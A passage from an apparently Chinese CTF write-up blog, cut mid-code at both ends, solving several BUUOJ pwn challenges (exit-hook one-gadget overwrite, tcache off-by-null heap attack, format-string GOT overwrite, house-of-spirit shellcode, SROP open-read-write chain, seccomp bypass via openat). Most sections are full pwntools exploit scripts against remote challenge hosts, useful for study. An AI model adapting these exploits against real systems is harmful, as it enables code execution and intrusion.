&amp;&amp; a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xA3</span>u )    <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You always want a Gold Finger!"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><p>对写入的地址也给限制了不能出现这几个字节。<br>其中就让很好的:</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x10a38c</span> execve(<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>, environ)<span class="hljs-symbol">constraints:</span>  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>] == NULL</code></pre></div><p>不让写入使用了。其他的因为地址小，爆破差距大，或者限制条件高，不适合使用。</p><p>想办法调整一下，来实现上面这个one gadget的使用。</p><p><a href="http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90" target="_blank" rel="noopener">http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90</a></p><p>参考 taqini师傅的这个文章，发现其中就有对这个的分析，发现最重要的就是：<br><code>rsi rdi rdx</code>要给控制好，其中这个gadget附近的汇编如图所示</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uQchWa.png" srcset="/img/loading.gif" alt></p><p>其中8c结尾的汇编之后是一定要执行的，其中就控制了<code>rsi rdi rdx</code>。并且8c这条汇编也是不可以跳过，控制的rax，在这个one gadget 中是很有用的，否则当初作者在写这个one gadget怎么没有跳过，直接从93结尾汇编开始了。</p><p>向上看有个call指令，这是对接下来的one gadget执行并无造成重要参数大的影响的，所以可以尝试向上写一个地址，让这个gadget从<code>0x10a387</code>开始。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/hDqu69.png" srcset="/img/loading.gif" alt><br>执行下去发现是可以满足<code>execve(&quot;/bin/sh&quot;, 0, environ)</code>的。</p><p>此题中对于exit hook 的改写中，<code>_dl_rtld_lock_recursive</code> 可以完成条件的满足。<code>_dl_rtld_unlock_recursive</code>不可以。<br>具体跟过去会发现是在第2和参数出了问题，且在one gadget中第二个参数的控制很玄学，且很难控制，让人头大。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)exit_hook = <span class="hljs-number">0x81df60</span> + libc_baseone = <span class="hljs-number">0x10a387</span> + libc_base<span class="hljs-comment"># debug()</span>sl(str(exit_hook))sla(<span class="hljs-string">'biang'</span>,chr((one  &amp;<span class="hljs-number">0xff</span>)))sla(<span class="hljs-string">'biang!'</span>,chr((one &gt;&gt; <span class="hljs-number">8</span> &amp;<span class="hljs-number">0xff</span>)))sla(<span class="hljs-string">'biang!'</span>,chr((one &gt;&gt; <span class="hljs-number">16</span> &amp;<span class="hljs-number">0xff</span>)))itr()</code></pre></div><h3 id="题记-4"><a href="#题记-4" class="headerlink" title="题记"></a>题记</h3><p>对于修改<code>_dl_fini</code>，又发现了一个很好的参考链接：<br><a href="https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1</a></p><h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a><code>sctf_2019_easy_heap</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><ul><li>开头mmap 一段内存 rwx</li><li>libc 2.27的off by null</li><li>没有show</li></ul><h3 id="攻击思路-6"><a href="#攻击思路-6" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>先上来申请一个0x1000的内存块，然后释放，可以保证每次申请的堆块上都存有libc信息，准备攻击利用</li><li>off by null 留出 2个重叠的堆块</li><li>一个攻击 mmap，另一个攻击malloc hook</li></ul><p>由于tcache 基本没有什么检查，利用起来较为容易。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./sctf_2019_easy_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28382</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">"dex"</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))ru(<span class="hljs-string">'0x'</span>)mmap = int(r(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)add(<span class="hljs-number">0x1000</span>)add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    add(<span class="hljs-number">0x90</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i+<span class="hljs-number">5</span>)    add(<span class="hljs-number">0xf0</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i+<span class="hljs-number">5</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x40</span>))free(<span class="hljs-number">4</span>)add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#8</span>free(<span class="hljs-number">4</span>)free(<span class="hljs-number">7</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x60'</span> + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">0</span>,p64(mmap) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#9</span>free(<span class="hljs-number">6</span>)free(<span class="hljs-number">8</span>)edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\xc0'</span> + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">5</span>,p8(<span class="hljs-number">0x30</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#8</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#10</span>shellcode = <span class="hljs-string">"""  call here  .ascii "/bin/sh"  .byte 0here:   pop rdi   xor rsi,rsi   xor rdx,rdx   mov rax,0x3b   syscall"""</span>edit(<span class="hljs-number">9</span>,asm(shellcode) + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">10</span>,p64(mmap) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x200</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="题记-5"><a href="#题记-5" class="headerlink" title="题记"></a>题记</h3><p>这个题还有一种办法攻击mmap就是用unlink来进行，因为题目就给了&amp;heap ，题目预期解就是这样。</p><p>另外一种解法，就是攻击stdout，泄漏libc地址，然后攻击malloc hook。</p><h2 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><code>ciscn_2019_sw_1</code></h2><h4 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h4><p>32位，单次格式化字符串的利用。无法一次性的获得shell。至少运行2次。</p><p>攻击<code>__do_global_dtors_aux_fini_array_entry</code>，让其再次运行一次，且同时改 printf got 的值为system plt。然后送一个 <code>/bin/sh\x00</code>即可。</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python">offset = <span class="hljs-number">4</span>payload = fmtstr_payload(offset,&#123;<span class="hljs-number">0x804979C</span>:<span class="hljs-number">0x8048534</span>,elf.got[<span class="hljs-string">'printf'</span>]:elf.plt[<span class="hljs-string">'system'</span>]&#125;,write_size = <span class="hljs-string">"short"</span>,numbwritten = <span class="hljs-number">0</span>)s(payload)sleep(<span class="hljs-number">1</span>)sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'/bin/sh\x00'</span>)itr()</code></pre></div><p>因为是32位，用<code>fmtstr_payload</code>是很好用的。</p><h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><ul><li>开头不输入<code>\n</code>，48字符可以泄露出stack地址</li><li>有第一段可控的栈，且可以覆盖到heap ptr</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400A29</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give me money~"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">strcpy</span>(dest, &amp;buf);  ptr = dest;  <span class="hljs-keyword">return</span> sub_4009C4();&#125;</code></pre></div><ul><li>一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。</li></ul><p>保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。</p><h3 id="攻击思路-7"><a href="#攻击思路-7" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address</li><li>申请同大小的堆，改ret address jmp 到 shellcode</li></ul><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn200'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26670</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'long'</span>,str(size))    sa(<span class="hljs-string">'me'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)shellcode = asm(shellcraft.sh())sa(<span class="hljs-string">'u'</span>,shellcode)ru(<span class="hljs-string">'\x05'</span>)leak_stack = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'leak_stack'</span>,leak_stack)shellcode_addr = leak_stack - <span class="hljs-number">0x50</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'id'</span>,<span class="hljs-string">'65'</span>)payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(leak_stack - <span class="hljs-number">0x90</span>)sa(<span class="hljs-string">'money'</span>,payload)free()payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(shellcode_addr)add(<span class="hljs-number">0x38</span>,payload)sleep(<span class="hljs-number">0.2</span>)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="vn-pwn-babybabypwn"><a href="#vn-pwn-babybabypwn" class="headerlink" title="vn_pwn_babybabypwn"></a><code>vn_pwn_babybabypwn</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><ul><li>开了沙盒保护，只能orw</li><li>开始给了libc地址</li><li>程序主要执行了<code>rt_sigreturn</code>，肯定是奔着srop去的</li></ul><h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul><li>orw的rop应该往哪里写，栈地址是不知道的</li></ul><p>可以在libc上找一段无用的地方进行写即可。比如 libc的bss，free hook段。</p><ul><li>有的gadget 使用ropgadget找不到</li></ul><div class="hljs"><pre><code class="hljs python">libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()</code></pre></div><p>可以通过机器码来找。</p><ul><li>srop 中frame执行的顺序</li></ul><p>frame.rip 是先执行的地址。而 frame.rsp 的值就是我们执行完 frame.rip 后，要执行的值</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = './vn_pwn_babybabypwn'elf = ELF(local_file)context.log_level = 'debug'debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote('node3.buuoj.cn',25535)    libc = elf.libc    #libc = ELF('.')context.arch = elf.archcontext.terminal = ['tmux','neww']#,''splitw','-h'rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()'line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015 0005: 0x15 0x09 0x00 0x00000009  if (A == mmap) goto 0015 0006: 0x15 0x08 0x00 0x0000000a  if (A == mprotect) goto 0015 0007: 0x15 0x07 0x00 0x00000029  if (A == socket) goto 0015 0008: 0x15 0x06 0x00 0x0000002a  if (A == connect) goto 0015 0009: 0x15 0x05 0x00 0x00000031  if (A == bind) goto 0015 0010: 0x15 0x04 0x00 0x00000032  if (A == listen) goto 0015 0011: 0x15 0x03 0x00 0x00000038  if (A == clone) goto 0015 0012: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0015 0013: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0015 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0015: 0x06 0x00 0x00 0x00000000  return KILL'ru('0x')libc_base =  int(r(12),16) - libc.sym['puts']info_addr('libc_base',libc_base)free_hook = 0x3c67a8 + libc_baseread = libc.sym['read'] + libc_baseputs = libc.sym['puts'] + libc_baseopen = libc.sym['open'] + libc_basepop_rdi= 0x0000000000021102 + libc_basepop_rsi = 0x00000000000202e8 + libc_basepop_rdx = 0x0000000000001b92 + libc_basesyscall_ret = libc.search(asm("syscall \nret")).next() + libc_base# syscall_ret = libc_base + 0x00000000000bc375 #: syscall; ret; frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = free_hookframe.rdx = 0x300frame.rip = syscall_retframe.rsp = free_hookpayload = str(frame)[8:] #前8字节是rt_sigreturn 其并不需要伪造。程序是主动调用的 sigreturn# print(hex(len(frame)))s(payload)orw = flat([    pop_rdi,0,pop_rsi,free_hook,pop_rdx,8,read,    pop_rdi,free_hook,pop_rsi,0,pop_rdx,0,open,    pop_rdi,3,pop_rsi,free_hook,pop_rdx,0x30,read,    pop_rdi,free_hook,puts])s(orw)sleep(0.2)s('./flag')# debug()itr()</code></pre></div><h3 id="题记-6"><a href="#题记-6" class="headerlink" title="题记"></a>题记</h3><div class="hljs"><pre><code class="hljs python">payload = str(frame)[<span class="hljs-number">8</span>:]</code></pre></div><p>对于为什么要从8字节开始的理解？</p><p>前8字节是<code>rt_sigreturn</code>,其有什么用？</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/votJbl.png" srcset="/img/loading.gif" alt></p><p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用sigreturn系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条ret指令会使得执行流跳转到这段sigreturn代码，被动地进行sigreturn系统调用,把原来保存的寄存器信息弹回去，最后恢复进程的执行。</p><p>由此可以得出，因为程序是主动调用sigreturn的，并不需要<code>rt_sigreturn</code>指向一段代码，再调用sigreturn系统调用。</p><h2 id="ciscn-2019-final-4"><a href="#ciscn-2019-final-4" class="headerlink" title="ciscn_2019_final_4"></a><code>ciscn_2019_final_4</code></h2><p>这个题还是很好的题目，考察了很多的基础知识点。</p><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><ul><li>开启了沙盒禁用execve</li><li>开头让你输入name，有一段可控的栈空间，且较大</li><li>pie保护没有开</li><li>存在反调试，使用ptrace做的，直接gdb attach过去会进入子程序，看不到堆情况(直接在fork 汇编处，改汇编，<code>jmp 到程序输出字符串的地方即可</code> )</li><li>watch函数中也用ptrace，监视了<code>open，mmap，fork，vfork，ptrace</code> </li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    ptrace(PTRACE_SYSCALL, a1, <span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L);    waitpid(a1, &amp;stat_loc, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> ( !(stat_loc &amp; <span class="hljs-number">0x7F</span>) || (<span class="hljs-keyword">char</span>)((<span class="hljs-keyword">char</span>)((stat_loc &amp; <span class="hljs-number">0x7F</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0</span> || (stat_loc &amp; <span class="hljs-number">0xFF00</span>) &gt;&gt; <span class="hljs-number">8</span> != <span class="hljs-number">5</span> )      <span class="hljs-keyword">break</span>;    ptrace(PTRACE_GETREGS, a1, <span class="hljs-number">0L</span>L, &amp;v3);    v2 = v4;    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">2</span> || v2 == <span class="hljs-number">9</span> || v2 == <span class="hljs-number">0x39</span> || v2 == <span class="hljs-number">0x3A</span> || v2 == <span class="hljs-number">0x65</span> )    &#123;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"hey! what are you doing?"</span>);      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;  &#125;</code></pre></div><p>这里可以监视一下execve，好像就可以不用开沙箱了。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>存在uaf</p><h3 id="难点-1"><a href="#难点-1" class="headerlink" title="难点"></a>难点</h3><h4 id="orw的rop-chain往哪里读"><a href="#orw的rop-chain往哪里读" class="headerlink" title="orw的rop chain往哪里读"></a>orw的rop chain往哪里读</h4><p>程序自身是存在较少的gadgets的，想直接完成orw 的rop chain，是不可能的。<br>上来因为没开pie，能简单的完成一个read功能。在泄漏libc以后，就有更大的发挥空间了。</p><p>开头name有一大块可控地址，该怎么使用上。先输入一段垃圾数据，留着寻找。</p><div class="hljs"><pre><code class="hljs python">sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'chumen77'</span>*<span class="hljs-number">10</span>)</code></pre></div><p>在控制malloc hook后，随意写个地址，让其crash在这里，查看下栈地址：</p><div class="hljs"><pre><code class="hljs python">data = <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0xdeadbeef</span>)add(<span class="hljs-number">0x68</span>,data)</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/JsY1bN.png" srcset="/img/loading.gif" alt><br>发现断在0xdeadbeef，栈上可以看到输入的name情况。</p><p>此处来一个栈劫持，增加rsp 指针0x38 ，接着ret上去，就可以执行name上的东西，这个东西肯定写成仅能完成的read rop chain。</p><p>因为pie没开，可以使用这个新的read 在bss段上读取一个新的rop chain，接着ret 上去执行。新的rop chain，可以为mprotect解开bss段的执行权限，接着跳上orw flag的shellcode即可。（<strong>mprotect 需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 这里直接设置为bss起始地址即可。</strong>）</p><h4 id="open被禁用了怎么办"><a href="#open被禁用了怎么办" class="headerlink" title="open被禁用了怎么办"></a>open被禁用了怎么办</h4><p>可以使用openat进行代替。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag, <span class="hljs-keyword">mode_t</span> mode)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">openat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag,  <span class="hljs-keyword">mode_t</span> mode )</span></span>;        <span class="hljs-comment">//函数执行成功返回文件描述符，失败返回-1.</span></code></pre></div><p><a href="https://blog.csdn.net/liangzc1124/article/details/83475246" target="_blank" rel="noopener">https://blog.csdn.net/liangzc1124/article/details/83475246</a></p><p><a href="https://www.cnblogs.com/BinBinStory/p/7400993.html" target="_blank" rel="noopener">https://www.cnblogs.com/BinBinStory/p/7400993.html</a></p><p>其中重点就是，当openat的path参数，输入是绝对地址时，fd就会被无视，其函数就相当于open了。所以此处的fd，也是可以设成任意值。</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_final_4'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25080</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span 